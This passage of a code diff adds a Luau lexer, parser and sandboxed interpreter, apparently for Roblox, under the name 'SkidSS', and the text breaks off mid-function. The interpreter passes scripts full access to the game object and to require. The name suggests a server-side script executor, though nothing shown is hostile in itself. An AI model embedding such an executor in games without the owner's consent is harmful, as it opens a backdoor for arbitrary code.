+		local j = i + 1
+		local level = 0
+		while at(j) == "=" do level += 1; j += 1 end
+		if at(j) ~= "[" then return nil end
+		j += 1
+
+		if at(j) == "\r" then j += 1 end
+		if at(j) == "\n" then line += 1; j += 1 end
+		local closer = "]" .. string.rep("=", level) .. "]"
+		local startLine = line
+		local from = j
+		while true do
+			if j > n then line = startLine; err("unfinished long bracket") end
+			local c = at(j)
+			if c == "]" and string.sub(src, j, j + level + 1) == closer then
+				local text = string.sub(src, from, j - 1)
+				i = j + level + 2
+				return text
+			end
+			if c == "\n" then line += 1 end
+			j += 1
+		end
+	end
+
+	local function readString(quote)
+		local parts = {}
+		i += 1
+		while true do
+			local c = at(i)
+			if c == "" or c == "\n" then err("unfinished string") end
+			if c == quote then i += 1; break end
+			if c == "\\" then
+				local e = at(i + 1)
+				if e == "x" then
+					local hex = string.sub(src, i + 2, i + 3)
+					local b = tonumber(hex, 16)
+					if not b then err("hexadecimal digit expected") end
+					parts[#parts + 1] = string.char(b)
+					i += 4
+				elseif e == "z" then
+					i += 2
+					while at(i):match("%s") do
+						if at(i) == "\n" then line += 1 end
+						i += 1
+					end
+				elseif e == "u" then
+					if at(i + 2) ~= "{" then err("missing '{' in \\u{xxxx}") end
+					local j = i + 3
+					while at(j) ~= "}" do
+						if at(j) == "" then err("unfinished string") end
+						j += 1
+					end
+					local cp = tonumber(string.sub(src, i + 3, j - 1), 16)
+					if not cp then err("hexadecimal digit expected") end
+					parts[#parts + 1] = utf8.char(cp)
+					i = j + 1
+				elseif isDigit(e) then
+					local d = e
+					local j = i + 2
+					for _ = 1, 2 do
+						if isDigit(at(j)) then d ..= at(j); j += 1 else break end
+					end
+					local b = tonumber(d)
+					if b > 255 then err("decimal escape too large") end
+					parts[#parts + 1] = string.char(b)
+					i = j
+				else
+					local rep = ESCAPES[e]
+					if not rep then err("invalid escape sequence '\\" .. e .. "'") end
+					if e == "\n" then line += 1 end
+					parts[#parts + 1] = rep
+					i += 2
+				end
+			else
+				parts[#parts + 1] = c
+				i += 1
+			end
+		end
+		return table.concat(parts)
+	end
+
+	local function readNumber()
+		local start = i
+		local two = string.sub(src, i, i + 1)
+		if two == "0x" or two == "0X" then
+			i += 2
+			while i <= n and (isHex(at(i)) or at(i) == "_") do i += 1 end
+		elseif two == "0b" or two == "0B" then
+			i += 2
+			while i <= n and (at(i) == "0" or at(i) == "1" or at(i) == "_") do i += 1 end
+		else
+			while i <= n and (isDigit(at(i)) or at(i) == "_") do i += 1 end
+			if at(i) == "." then
+				i += 1
+				while i <= n and (isDigit(at(i)) or at(i) == "_") do i += 1 end
+			end
+			local e = at(i)
+			if e == "e" or e == "E" then
+				i += 1
+				if at(i) == "+" or at(i) == "-" then i += 1 end
+				while i <= n and isDigit(at(i)) do i += 1 end
+			end
+		end
+		local text = string.sub(src, start, i - 1)
+		local clean = string.gsub(text, "_", "")
+		local value
+		local prefix = string.sub(clean, 1, 2)
+		if prefix == "0b" or prefix == "0B" then
+			value = tonumber(string.sub(clean, 3), 2)
+		else
+			value = tonumber(clean)
+		end
+		if not value then err("malformed number near '" .. text .. "'") end
+		return value
+	end
+
+	while i <= n do
+		local c = at(i)
+		if c == "\n" then
+			line += 1; i += 1
+		elseif c == " " or c == "\t" or c == "\r" or c == "\v" or c == "\f" then
+			i += 1
+		elseif c == "-" and at(i + 1) == "-" then
+
+			i += 2
+			if at(i) == "[" then
+				local saved = i
+				local text = readLong()
+				if not text then i = saved; while i <= n and at(i) ~= "\n" do i += 1 end end
+			else
+				while i <= n and at(i) ~= "\n" do i += 1 end
+			end
+		elseif isAlpha(c) then
+			local start = i
+			while i <= n and isAlphaNum(at(i)) do i += 1 end
+			local word = string.sub(src, start, i - 1)
+			tokens[#tokens + 1] = {
+				type = KEYWORDS[word] and "Keyword" or "Name",
+				value = word,
+				line = line,
+			}
+		elseif isDigit(c) or (c == "." and isDigit(at(i + 1))) then
+			local ln = line
+			tokens[#tokens + 1] = { type = "Number", value = readNumber(), line = ln }
+		elseif c == '"' or c == "'" then
+			local ln = line
+			tokens[#tokens + 1] = { type = "String", value = readString(c), line = ln }
+		elseif c == "[" and (at(i + 1) == "[" or at(i + 1) == "=") then
+			local saved = i
+			local ln = line
+			local text = readLong()
+			if text then
+				tokens[#tokens + 1] = { type = "String", value = text, line = ln }
+			else
+
+				i = saved
+				tokens[#tokens + 1] = { type = "Symbol", value = "[", line = line }
+				i += 1
+			end
+		else
+			local s3 = string.sub(src, i, i + 2)
+			local s2 = string.sub(src, i, i + 1)
+			if SYM3[s3] then
+				tokens[#tokens + 1] = { type = "Symbol", value = s3, line = line }; i += 3
+			elseif SYM2[s2] then
+				tokens[#tokens + 1] = { type = "Symbol", value = s2, line = line }; i += 2
+			elseif SYM1[c] then
+				tokens[#tokens + 1] = { type = "Symbol", value = c, line = line }; i += 1
+			else
+				err("unexpected symbol '" .. c .. "'")
+			end
+		end
+	end
+
+	tokens[#tokens + 1] = { type = "Eof", value = "<eof>", line = line }
+	return tokens
+end
+
+function Lexer.safeTokenize(src)
+	local ok, result = pcall(Lexer.tokenize, src)
+	if ok then return result end
+	if type(result) == "table" and result.__skidss_lex then
+		return nil, result.message
+	end
+	return nil, tostring(result)
+end
+
+return Lexer
+end)()
+
+local SkidSS_LuaParser = (function()
+local Lexer = SkidSS_LuaLexer
+
+local Parser = {}
+
+local COMPOUND = {
+	["+="] = "+", ["-="] = "-", ["*="] = "*", ["/="] = "/", ["//="] = "//",
+	["%="] = "%", ["^="] = "^", ["..="] = "..",
+}
+
+local BINPRI = {
+	["or"] = { 1, 1 }, ["and"] = { 2, 2 },
+	["<"] = { 3, 3 }, [">"] = { 3, 3 }, ["<="] = { 3, 3 }, [">="] = { 3, 3 },
+	["~="] = { 3, 3 }, ["=="] = { 3, 3 },
+	[".."] = { 9, 8 },
+	["+"] = { 10, 10 }, ["-"] = { 10, 10 },
+	["*"] = { 11, 11 }, ["/"] = { 11, 11 }, ["//"] = { 11, 11 }, ["%"] = { 11, 11 },
+	["^"] = { 14, 13 },
+}
+local UNARY_PRI = 12
+
+function Parser.parse(tokens)
+	local pos = 1
+
+	local function cur() return tokens[pos] end
+	local function peek(off) return tokens[pos + off] end
+	local function advance() local t = tokens[pos]; pos += 1; return t end
+
+	local function isSym(t, v) return t ~= nil and t.type == "Symbol" and t.value == v end
+	local function isKw(t, v) return t ~= nil and t.type == "Keyword" and t.value == v end
+	local function checkSym(v) return isSym(cur(), v) end
+	local function checkKw(v) return isKw(cur(), v) end
+	local function acceptSym(v) if checkSym(v) then return advance() end return nil end
+	local function acceptKw(v) if checkKw(v) then return advance() end return nil end
+
+	local function perror(msg, tok)
+		tok = tok or cur()
+		error({ __skidss_parse = true, message = "input:" .. (tok and tok.line or 0) .. ": " .. msg }, 0)
+	end
+	local function expectSym(v) if not checkSym(v) then perror("'" .. v .. "' expected") end return advance() end
+	local function expectKw(v) if not checkKw(v) then perror("'" .. v .. "' expected") end return advance() end
+	local function expectName()
+		local t = cur()
+		if t.type ~= "Name" then perror("<name> expected") end
+		pos += 1
+		return t.value
+	end
+
+	local parseExpr, parseBlock, parseStatement, parseFuncBody, skipType
+
+	local function skipBalanced()
+		local matching = { ["("] = ")", ["{"] = "}", ["["] = "]", ["<"] = ">" }
+		local stack = {}
+		repeat
+			local t = advance()
+			if t.type == "Eof" then perror("unfinished type annotation") end
+			if t.type == "Symbol" then
+				if matching[t.value] then
+					stack[#stack + 1] = matching[t.value]
+				elseif t.value == stack[#stack] then
+					stack[#stack] = nil
+				end
+			end
+		until #stack == 0
+	end
+
+	local function skipTypePrimary()
+		local t = cur()
+		if isSym(t, "(") or isSym(t, "{") then
+			skipBalanced()
+		elseif t.type == "Name" then
+			advance()
+			while acceptSym(".") do expectName() end
+			if checkSym("<") then skipBalanced() end
+		elseif t.type == "String" or t.type == "Number" then
+			advance()
+		elseif isKw(t, "nil") or isKw(t, "true") or isKw(t, "false") then
+			advance()
+		elseif isKw(t, "function") then
+			advance()
+			if checkSym("<") then skipBalanced() end
+			if checkSym("(") then skipBalanced() end
+			if acceptSym("->") then skipType() end
+		else
+			perror("type annotation not supported in this interpreter (v1)")
+		end
+	end
+
+	function skipType()
+		skipTypePrimary()
+		while acceptSym("?") do end
+		while checkSym("|") or checkSym("&") do
+			advance(); skipTypePrimary(); while acceptSym("?") do end
+		end
+		if acceptSym("->") then skipType() end
+	end
+
+	local function parseExprList()
+		local list = { parseExpr() }
+		while acceptSym(",") do list[#list + 1] = parseExpr() end
+		return list
+	end
+
+	local function parseTableConstructor()
+		local line = cur().line
+		expectSym("{")
+		local fields = {}
+		while not checkSym("}") do
+			if checkSym("[") then
+				advance()
+				local k = parseExpr()
+				expectSym("]"); expectSym("=")
+				fields[#fields + 1] = { type = "rec", key = k, value = parseExpr() }
+			elseif cur().type == "Name" and isSym(peek(1), "=") then
+				local name = advance().value
+				advance()
+				fields[#fields + 1] = { type = "named", name = name, value = parseExpr() }
+			else
+				fields[#fields + 1] = { type = "item", value = parseExpr() }
+			end
+			if not (acceptSym(",") or acceptSym(";")) then break end
+		end
+		expectSym("}")
+		return { kind = "Table", fields = fields, line = line }
+	end
+
+	local function parseArgs()
+		if checkSym("(") then
+			advance()
+			local args = {}
+			if not checkSym(")") then args = parseExprList() end
+			expectSym(")")
+			return args
+		elseif cur().type == "String" then
+			local t = advance()
+			return { { kind = "String", value = t.value, line = t.line } }
+		elseif checkSym("{") then
+			return { parseTableConstructor() }
+		end
+		perror("function arguments expected")
+	end
+
+	local function parsePrimary()
+		local t = cur()
+		if isSym(t, "(") then
+			advance()
+			local e = parseExpr()
+			expectSym(")")
+			return { kind = "Paren", expr = e, line = t.line }
+		elseif t.type == "Name" then
+			advance()
+			return { kind = "Name", name = t.value, line = t.line }
+		end
+		perror("unexpected symbol near '" .. tostring(t.value) .. "'")
+	end
+
+	local function parseSuffixed()
+		local e = parsePrimary()
+		while true do
+			local t = cur()
+			if isSym(t, ".") then
+				advance()
+				local name = expectName()
+				e = { kind = "Index", obj = e, index = { kind = "String", value = name, line = t.line }, field = name, line = t.line }
+			elseif isSym(t, "[") then
+				advance()
+				local k = parseExpr()
+				expectSym("]")
+				e = { kind = "Index", obj = e, index = k, line = t.line }
+			elseif isSym(t, ":") then
+				advance()
+				local m = expectName()
+				e = { kind = "MethodCall", obj = e, method = m, args = parseArgs(), line = t.line }
+			elseif isSym(t, "(") or isSym(t, "{") or t.type == "String" then
+				e = { kind = "Call", func = e, args = parseArgs(), line = t.line }
+			else
+				break
+			end
+		end
+		return e
+	end
+
+	local function parseSimple()
+		local t = cur()
+		if t.type == "Number" then advance(); return { kind = "Number", value = t.value, line = t.line }
+		elseif t.type == "String" then advance(); return { kind = "String", value = t.value, line = t.line }
+		elseif isKw(t, "nil") then advance(); return { kind = "Nil", line = t.line }
+		elseif isKw(t, "true") then advance(); return { kind = "True", line = t.line }
+		elseif isKw(t, "false") then advance(); return { kind = "False", line = t.line }
+		elseif isSym(t, "...") then advance(); return { kind = "Vararg", line = t.line }
+		elseif isSym(t, "{") then return parseTableConstructor()
+		elseif isKw(t, "function") then
+			advance()
+			local fb = parseFuncBody()
+			return { kind = "Function", params = fb.params, isVararg = fb.isVararg, body = fb.body, line = t.line }
+		end
+		return parseSuffixed()
+	end
+
+	local function binOpOf(t)
+		if t.type == "Symbol" and BINPRI[t.value] then return t.value end
+		if t.type == "Keyword" and (t.value == "and" or t.value == "or") then return t.value end
+		return nil
+	end
+
+	local function parseSubExpr(limit)
+		local e
+		local t = cur()
+		if (t.type == "Symbol" and (t.value == "-" or t.value == "#")) or isKw(t, "not") then
+			advance()
+			e = { kind = "Unop", op = t.value, operand = parseSubExpr(UNARY_PRI), line = t.line }
+		else
+			e = parseSimple()
+		end
+		while true do
+			local op = binOpOf(cur())
+			if not op then break end
+			local pri = BINPRI[op]
+			if pri[1] <= limit then break end
+			local opTok = advance()
+			e = { kind = "Binop", op = op, lhs = e, rhs = parseSubExpr(pri[2]), line = opTok.line }
+		end
+		return e
+	end
+
+	function parseExpr()
+		local e = parseSubExpr(0)
+		while acceptSym("::") do skipType() end
+		return e
+	end
+
+	function parseFuncBody()
+		if checkSym("<") then skipBalanced() end
+		expectSym("(")
+		local params = {}
+		local isVararg = false
+		if not checkSym(")") then
+			while true do
+				if checkSym("...") then
+					advance(); isVararg = true
+					if acceptSym(":") then skipType() end
+					break
+				end
+				local nm = expectName()
+				if acceptSym(":") then skipType() end
+				params[#params + 1] = nm
+				if not acceptSym(",") then break end
+			end
+		end
+		expectSym(")")
+		if acceptSym(":") then skipType() end
+		local body = parseBlock()
+		expectKw("end")
+		return { params = params, isVararg = isVararg, body = body }
+	end
+
+	local function parseLocal()
+		local line = cur().line
+		expectKw("local")
+		if acceptKw("function") then
+			local name = expectName()
+			local fb = parseFuncBody()
+			return {
+				kind = "LocalFunction",
+				name = name,
+				func = { kind = "Function", params = fb.params, isVararg = fb.isVararg, body = fb.body, line = line },
+				line = line,
+			}
+		end
+		local names = {}
+		while true do
+			names[#names + 1] = expectName()
+			if acceptSym("<") then expectName(); expectSym(">") end
+			if acceptSym(":") then skipType() end
+			if not acceptSym(",") then break end
+		end
+		local exprs = {}
+		if acceptSym("=") then exprs = parseExprList() end
+		return { kind = "Local", names = names, exprs = exprs, line = line }
+	end
+
+	local function parseIf()
+		local line = cur().line
+		expectKw("if")
+		local clauses = {}
+		local cond = parseExpr()
+		expectKw("then")
+		clauses[#clauses + 1] = { cond = cond, body = parseBlock() }
+		while checkKw("elseif") do
+			advance()
+			local c = parseExpr()
+			expectKw("then")
+			clauses[#clauses + 1] = { cond = c, body = parseBlock() }
+		end
+		local elseBody = nil
+		if acceptKw("else") then elseBody = parseBlock() end
+		expectKw("end")
+		return { kind = "If", clauses = clauses, elseBody = elseBody, line = line }
+	end
+
+	local function parseWhile()
+		local line = cur().line
+		expectKw("while")
+		local cond = parseExpr()
+		expectKw("do")
+		local body = parseBlock()
+		expectKw("end")
+		return { kind = "While", cond = cond, body = body, line = line }
+	end
+
+	local function parseRepeat()
+		local line = cur().line
+		expectKw("repeat")
+		local body = parseBlock()
+		expectKw("until")
+		return { kind = "Repeat", body = body, cond = parseExpr(), line = line }
+	end
+
+	local function parseFor()
+		local line = cur().line
+		expectKw("for")
+		local n1 = expectName()
+		if acceptSym(":") then skipType() end
+		if acceptSym("=") then
+			local startE = parseExpr()
+			expectSym(",")
+			local stopE = parseExpr()
+			local stepE = nil
+			if acceptSym(",") then stepE = parseExpr() end
+			expectKw("do")
+			local body = parseBlock()
+			expectKw("end")
+			return { kind = "NumericFor", var = n1, start = startE, stop = stopE, step = stepE, body = body, line = line }
+		end
+		local names = { n1 }
+		while acceptSym(",") do
+			names[#names + 1] = expectName()
+			if acceptSym(":") then skipType() end
+		end
+		expectKw("in")
+		local exprs = parseExprList()
+		expectKw("do")
+		local body = parseBlock()
+		expectKw("end")
+		return { kind = "GenericFor", names = names, exprs = exprs, body = body, line = line }
+	end
+
+	local function parseFunctionStat()
+		local line = cur().line
+		expectKw("function")
+		local target = { kind = "Name", name = expectName(), line = line }
+		while acceptSym(".") do
+			local f = expectName()
+			target = { kind = "Index", obj = target, index = { kind = "String", value = f, line = line }, field = f, line = line }
+		end
+		local isMethod = false
+		if acceptSym(":") then
+			local m = expectName()
+			target = { kind = "Index", obj = target, index = { kind = "String", value = m, line = line }, field = m, line = line }
+			isMethod = true
+		end
+		local fb = parseFuncBody()
+		if isMethod then table.insert(fb.params, 1, "self") end
+		return {
+			kind = "Assign",
+			targets = { target },
+			exprs = { { kind = "Function", params = fb.params, isVararg = fb.isVararg, body = fb.body, line = line } },
+			line = line,
+		}
+	end
+
+	local function parseExprStatement()
+		local first = parseSuffixed()
+		local t = cur()
+		if isSym(t, "=") or isSym(t, ",") then
+			local targets = { first }
+			while acceptSym(",") do targets[#targets + 1] = parseSuffixed() end
+			expectSym("=")
+			local exprs = parseExprList()
+			for _, tg in ipairs(targets) do
+				if tg.kind ~= "Name" and tg.kind ~= "Index" then perror("cannot assign to this expression", tg) end
+			end
+			return { kind = "Assign", targets = targets, exprs = exprs, line = first.line }
+		elseif t.type == "Symbol" and COMPOUND[t.value] then
+			advance()
+			if first.kind ~= "Name" and first.kind ~= "Index" then perror("cannot assign to this expression", first) end
+			return { kind = "CompoundAssign", op = COMPOUND[t.value], target = first, expr = parseExpr(), line = t.line }
+		end
+		if first.kind ~= "Call" and first.kind ~= "MethodCall" then
+			perror("syntax error near '" .. tostring(t.value) .. "'")
+		end
+		return { kind = "CallStat", call = first, line = first.line }
+	end
+
+	local function continueIsStatement()
+		local nxt = peek(1)
+		if nxt == nil or nxt.type == "Eof" then return true end
+		if nxt.type == "String" then return false end
+		if nxt.type == "Symbol" then
+			local v = nxt.value
+			if v == "=" or v == "," or v == "." or v == "[" or v == "(" or v == "{"
+				or v == ":" or COMPOUND[v] then
+				return false
+			end
+		end
+		return true
+	end
+
+	function parseStatement()
+		local t = cur()
+		if isSym(t, ";") then advance(); return nil end
+		if t.type == "Keyword" then
+			local kw = t.value
+			if kw == "local" then return parseLocal()
+			elseif kw == "if" then return parseIf()
+			elseif kw == "while" then return parseWhile()
+			elseif kw == "for" then return parseFor()
+			elseif kw == "repeat" then return parseRepeat()
+			elseif kw == "do" then
+				advance()
+				local body = parseBlock()
+				expectKw("end")
+				return { kind = "Do", body = body, line = t.line }
+			elseif kw == "function" then return parseFunctionStat()
+			elseif kw == "break" then advance(); return { kind = "Break", line = t.line }
+			end
+			perror("unexpected keyword '" .. kw .. "'")
+		end
+		if t.type == "Name" and t.value == "continue" and continueIsStatement() then
+			advance()
+			return { kind = "Continue", line = t.line }
+		end
+		return parseExprStatement()
+	end
+
+	local function isBlockEnd(t)
+		return t.type == "Eof" or isKw(t, "end") or isKw(t, "else")
+			or isKw(t, "elseif") or isKw(t, "until")
+	end
+
+	function parseBlock()
+		local stmts = {}
+		while not isBlockEnd(cur()) do
+			local t = cur()
+			if isKw(t, "return") then
+				advance()
+				local exprs = {}
+				if not (isBlockEnd(cur()) or checkSym(";")) then exprs = parseExprList() end
+				acceptSym(";")
+				stmts[#stmts + 1] = { kind = "Return", exprs = exprs, line = t.line }
+				break
+			end
+			local s = parseStatement()
+			if s then stmts[#stmts + 1] = s end
+		end
+		return stmts
+	end
+
+	local ok, result = pcall(function()
+		local body = parseBlock()
+		if cur().type ~= "Eof" then
+			perror("'<eof>' expected near '" .. tostring(cur().value) .. "'")
+		end
+		return body
+	end)
+	if ok then return result end
+	if type(result) == "table" and result.__skidss_parse then return nil, result.message end
+	return nil, tostring(result)
+end
+
+return Parser
+end)()
+
+local SkidSS_LuaInterp = (function()
+local Lexer = SkidSS_LuaLexer
+local Parser = SkidSS_LuaParser
+
+local robloxTick = tick
+
+local Interp = {}
+
+local DEFAULTS = {
+	MaxLuaSteps = 10000000,
+	MaxLuaSeconds = 2,
+	MaxLuaDepth = 200,
+	MaxWaitSeconds = 30,
+}
+
+local BINOPS = {
+	["+"] = function(a, b) return a + b end,
+	["-"] = function(a, b) return a - b end,
+	["*"] = function(a, b) return a * b end,
+	["/"] = function(a, b) return a / b end,
+	["%"] = function(a, b) return a % b end,
+	["^"] = function(a, b) return a ^ b end,
+	["//"] = function(a, b) return a // b end,
+	[".."] = function(a, b) return a .. b end,
+	["=="] = function(a, b) return a == b end,
+	["~="] = function(a, b) return a ~= b end,
+	["<"] = function(a, b) return a < b end,
+	["<="] = function(a, b) return a <= b end,
+	[">"] = function(a, b) return a > b end,
+	[">="] = function(a, b) return a >= b end,
+}
+
+local Scope = {}
+Scope.__index = Scope
+local function newScope(parent) return setmetatable({ vars = {}, parent = parent }, Scope) end
+function Scope:define(name, value) self.vars[name] = { value = value } end
+function Scope:lookup(name)
+	local s = self
+	while s do
+		local c = s.vars[name]
+		if c then return c end
+		s = s.parent
+	end
+	return nil
+end
+
+local function isAbort(e) return type(e) == "table" and e.__skidss_abort == true end
+local function abort(message) error({ __skidss_abort = true, message = message }) end
+
+local function tick(state)
+	state.steps += 1
+	if state.steps > state.maxSteps then
+		abort("step budget exceeded (" .. state.maxSteps .. ") — possible infinite loop")
+	end
+	if state.steps % 4096 == 0 and (os.clock() - state.start) > state.maxSeconds then
+		abort("time budget exceeded (" .. state.maxSeconds .. "s) — possible infinite loop")
+	end
+end
+
+local function rtError(state, msg)
+	error("input:" .. tostring(state.line) .. ": " .. msg, 0)
+end
+
+local function cleanMessage(err, state)
+	if isAbort(err) then return tostring(err.message) end
+	if type(err) ~= "string" then return tostring(err) end
+	if string.match(err, "^input:%d+:") then return err end
+	local rest = string.match(err, "^[%w%._%- ]-:%d+:%s*(.*)$")
+	if rest then return "input:" .. tostring(state.line) .. ": " .. rest end
+	return "input:" .. tostring(state.line) .. ": " .. err
+end
+
+local function buildEnv(state)
+	local emit = state.emit
+	local maxWait = state.limits.MaxWaitSeconds or DEFAULTS.MaxWaitSeconds
+
+	local function collect(...)
+		local parts = {}
+		local nargs = select("#", ...)
+		for i = 1, nargs do parts[i] = tostring((select(i, ...))) end
+		return table.concat(parts, " ")
+	end
+
+	local function cappedWait(t)
+		t = tonumber(t) or 0
+		if t > maxWait then t = maxWait end
+		local dt = task.wait(t)
+		state.start = os.clock()
+		return dt
+	end
+
+	local G = {}
+
+	G.print = function(...) emit(collect(...)) end
+	G.warn = function(...) emit("[warn] " .. collect(...)) end
+
+	G.pcall = function(f, ...)
+		local saved = state.depth
+		local res = table.pack(pcall(f, ...))
+		state.depth = saved
+		if res[1] == false and isAbort(res[2]) then error(res[2]) end
+		return table.unpack(res, 1, res.n)
+	end
+	G.xpcall = function(f, handler, ...)
+		local saved = state.depth
+		local res = table.pack(xpcall(f, function(e)
+			if isAbort(e) then return e end
+			return handler(e)
+		end, ...))
+		state.depth = saved
+		if res[1] == false and isAbort(res[2]) then error(res[2]) end
+		return table.unpack(res, 1, res.n)
+	end
+
+	G.error = function(msg, level)
+		if level == nil then level = 1 end
+		if level ~= 0 and type(msg) == "string" then
+			msg = "input:" .. tostring(state.line) .. ": " .. msg
+		end
+		error(msg, 0)
+	end
+	G.assert = function(v, msg, ...)
+		if v == nil or v == false then
+			return G.error(msg == nil and "assertion failed!" or msg)
+		end
+		return v, msg, ...
+	end
+
+	G.pairs = pairs
+	G.ipairs = ipairs
+	G.next = next
+	G.select = select
+	G.type = type
+	G.typeof = typeof
+	G.tostring = tostring
+	G.tonumber = tonumber
+	G.setmetatable = setmetatable
+	G.getmetatable = getmetatable
+	G.rawget = rawget
+	G.rawset = rawset
+	G.rawequal = rawequal
+	G.rawlen = rawlen
+	G.unpack = table.unpack
+
+	G.string = string
+	G.table = table
+	G.math = math
+	G.bit32 = bit32
+	G.utf8 = utf8
+	G.coroutine = coroutine
+	G.os = { time = os.time, clock = os.clock, date = os.date, difftime = os.difftime }
+	G.task = setmetatable(
+		{ wait = cappedWait, spawn = task.spawn, delay = task.delay, defer = task.defer, cancel = task.cancel },
+		{ __index = task }
+	)
+	G.wait = cappedWait
+	G.delay = function(t, f) return task.delay(tonumber(t) or 0, f) end
+	G.spawn = function(f) return task.spawn(f) end
+	G.tick = robloxTick
+
+	G.game = game
+	G.workspace = workspace
+	G.Enum = Enum
+	G.Instance = Instance
+	G.Vector2 = Vector2
+	G.Vector3 = Vector3
+	G.Vector3int16 = Vector3int16
+	G.CFrame = CFrame
+	G.Color3 = Color3
+	G.ColorSequence = ColorSequence
+	G.ColorSequenceKeypoint = ColorSequenceKeypoint
+	G.NumberSequence = NumberSequence
+	G.NumberSequenceKeypoint = NumberSequenceKeypoint
+	G.NumberRange = NumberRange
+	G.UDim = UDim
+	G.UDim2 = UDim2
+	G.BrickColor = BrickColor
+	G.Ray = Ray
+	G.Rect = Rect
+	G.Region3 = Region3
+	G.TweenInfo = TweenInfo
+	G.PhysicalProperties = PhysicalProperties
+	G.Random = Random
+	G.DateTime = DateTime
+	G.Faces = Faces
+	G.Axes = Axes
+	G.newproxy = newproxy
+
+	G.require = require
+
+	local function unavailable(name)
+		return function() error("'" .. name .. "' is not available in the SkidSS interpreter (v1)", 0) end
+	end
+	G.loadstring = unavailable("loadstring")
+	G.getfenv = unavailable("getfenv")
+	G.setfenv = unavailable("setfenv")
+
+	G._G = G
+	G.shared = {}
+	G._VERSION = _VERSION
+
+	return G
+end
+
+local evalExpr, evalMulti, evalExprList, evalCall, evalTable, evalBinop
+local makeClosure, makeSetter
+local execBlock, execStmt, execAssign, execCompound, execNumericFor, execGenericFor
+
+function evalCall(node, scope, state)
+	local fn, selfArg
+	if node.kind == "MethodCall" then
+		local obj = evalExpr(node.obj, scope, state)
+		if obj == nil then rtError(state, "attempt to index nil with '" .. node.method .. "'") end
+		fn = obj[node.method]
+		selfArg = obj
+	else
+		fn = evalExpr(node.func, scope, state)
+	end
+	local args = evalExprList(node.args, scope, state)
+	state.line = node.line or state.line
+	if type(fn) ~= "function" then
+		local okmt, mt = pcall(getmetatable, fn)
+		local callable = okmt and type(mt) == "table" and rawget(mt, "__call") ~= nil
+		if not callable then
+			local nm = node.kind == "MethodCall" and (" '" .. node.method .. "'") or ""
+			rtError(state, "attempt to call a " .. typeof(fn) .. " value" .. nm)
+		end
+	end
+	if node.kind == "MethodCall" then
+		return table.pack(fn(selfArg, table.unpack(args, 1, args.n)))
+	end
+	return table.pack(fn(table.unpack(args, 1, args.n)))
+end
+
+function evalMulti(node, scope, state)
+	local k = node.kind
+	if k == "Call" or k == "MethodCall" then
+		return evalCall(node, scope, state)
+	elseif k == "Vararg" then
+		local cell = scope:lookup("...")
+		local v = cell and cell.value
+		return v or { n = 0 }
+	end
+	return { n = 1, [1] = evalExpr(node, scope, state) }
+end
+
+function evalExprList(list, scope, state)
+	local out = { n = 0 }
+	local count = #list
+	if count == 0 then return out end
+	for i = 1, count - 1 do
+		out[i] = evalExpr(list[i], scope, state)
+	end
+	local last = evalMulti(list[count], scope, state)
+	local base = count - 1
+	for i = 1, last.n do out[base + i] = last[i] end
+	out.n = base + last.n
+	return out
+end
+
+function evalTable(node, scope, state)
+	local t = {}
+	local arr = 0
+	local fields = node.fields
+	local count = #fields
+	for i = 1, count do
+		local f = fields[i]
+		if f.type == "item" then
+			if i == count then
+				local m = evalMulti(f.value, scope, state)
+				for j = 1, m.n do arr += 1; t[arr] = m[j] end
+			else
+				arr += 1
+				t[arr] = evalExpr(f.value, scope, state)
+			end
+		elseif f.type == "named" then
+			t[f.name] = evalExpr(f.value, scope, state)
+		else
+			local key = evalExpr(f.key, scope, state)
+			if key == nil then rtError(state, "table index is nil") end
+			t[key] = evalExpr(f.value, scope, state)
+		end
+	end
+	return t
+end
+
+function evalBinop(node, scope, state)
+	local op = node.op
+	if op == "and" then
+		local l = evalExpr(node.lhs, scope, state)
+		if l == nil or l == false then return l end
+		return evalExpr(node.rhs, scope, state)
+	elseif op == "or" then
+		local l = evalExpr(node.lhs, scope, state)
+		if l ~= nil and l ~= false then return l end
+		return evalExpr(node.rhs, scope, state)
+	end
+	local l = evalExpr(node.lhs, scope, state)
+	local r = evalExpr(node.rhs, scope, state)
+	state.line = node.line or state.line
+	return BINOPS[op](l, r)
+end
+
+function makeClosure(node, defScope, state)
+	local params = node.params
+	local nparams = #params
+	local isVararg = node.isVararg
+	local body = node.body
+	return function(...)
+		local fnScope = newScope(defScope)
+		local argc = select("#", ...)
+		local argv = table.pack(...)
+		for i = 1, nparams do fnScope:define(params[i], argv[i]) end
+		if isVararg then
+			local extra = { n = math.max(0, argc - nparams) }
+			for i = 1, extra.n do extra[i] = argv[nparams + i] end
+			fnScope.vars["..."] = { value = extra }
+		end
+		state.depth += 1
+		if state.depth > state.maxDepth then
+			state.depth -= 1
+			abort("call stack too deep (" .. state.maxDepth .. ")")
+		end
+		local sig = execBlock(body, fnScope, state)
+		state.depth -= 1
+		if type(sig) == "table" and sig.kind == "return" then
+			return table.unpack(sig.values, 1, sig.values.n)
+		end
+		return
+	end
+end
+
+function evalExpr(node, scope, state)
+	if node.line then state.line = node.line end
+	tick(state)
+	local k = node.kind
+	if k == "Number" or k == "String" then
+		return node.value
+	elseif k == "Name" then
+		local cell = scope:lookup(node.name)
+		if cell then return cell.value end
+		return state.G[node.name]
+	elseif k == "Binop" then
+		return evalBinop(node, scope, state)
+	elseif k == "Call" or k == "MethodCall" then
+		return (evalCall(node, scope, state))[1]
+	elseif k == "Index" then
+		local obj = evalExpr(node.obj, scope, state)
+		if obj == nil then
+			rtError(state, "attempt to index nil" .. (node.field and (" with '" .. node.field .. "'") or ""))
+		end
+		return obj[evalExpr(node.index, scope, state)]
+	elseif k == "Nil" then
+		return nil
+	elseif k == "True" then
+		return true
+	elseif k == "False" then
+		return false
+	elseif k == "Unop" then
+		local v = evalExpr(node.operand, scope, state)
+		state.line = node.line or state.line
+		if node.op == "not" then return not v
+		elseif node.op == "-" then return -v
+		else return #v end
+	elseif k == "Table" then
+		return evalTable(node, scope, state)
+	elseif k == "Function" then
+		return makeClosure(node, scope, state)
+	elseif k == "Paren" then
+		return evalExpr(node.expr, scope, state)
+	elseif k == "Vararg" then
+		local cell = scope:lookup("...")
+		local v = cell and cell.value
+		return v and v[1] or nil
+	end
+	rtError(state, "cannot evaluate '" .. tostring(k) .. "'")
+end
+
+function makeSetter(target, scope, state)
+	if target.kind == "Name" then
+		local name = target.name
+		return function(v)
+			local cell = scope:lookup(name)
+			if cell then cell.value = v else state.G[name] = v end
+		end
+	end
+	local obj = evalExpr(target.obj, scope, state)
+	if obj == nil then
+		rtError(state, "attempt to index nil" .. (target.field and (" with '" .. target.field .. "'") or ""))
+	end
+	local key = evalExpr(target.index, scope, state)
+	return function(v) obj[key] = v end
+end
+
+function execAssign(node, scope, state)
+	local setters = {}
